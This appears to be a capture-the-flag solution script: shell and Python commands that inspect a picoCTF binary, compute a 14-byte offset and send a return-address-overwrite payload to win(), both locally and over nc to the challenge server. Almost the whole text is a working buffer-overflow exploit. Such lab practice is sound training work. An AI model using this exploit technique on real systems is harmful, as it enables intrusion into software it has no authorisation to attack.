# Step 1: Identify the binary
file vuln

# Step 2: Check protections
checksec --file=vuln

# Step 3: Find function addresses
objdump -d vuln | grep -E "<win>|<UnderConstruction>|<vuln>|<main>"

# Step 4: Examine win() stack frame (check sub esp instruction)
objdump -d vuln | grep -A 10 "08049d90 <win>"

# Step 5: Examine vuln() to confirm buf offset
objdump -d vuln | grep -A 20 "<vuln>:"

# Step 6: Calculate offset manually
python3 -c "
# var_A = -0xA from EBP = 10 bytes below EBP
# saved EBP = 4 bytes
# total to ret addr = 14
print('Offset:', 10 + 4)
"

# Step 7: Quick manual test (local)
python3 -c "
import struct
payload = b'A'*14 + struct.pack('<I', 0x08049d90) + struct.pack('<I', 0x08049e10)
import sys; sys.stdout.buffer.write(payload + b'\n')
" | ./vuln

# Step 8: Run exploit against remote
python3 exploit.py

# Step 9: Manual nc test
python3 -c "
import struct, sys
sys.stdout.buffer.write(b'A'*14 + struct.pack('<I', 0x08049d90) + struct.pack('<I', 0x08049e10) + b'\n')
" | nc saturn.picoctf.net 60056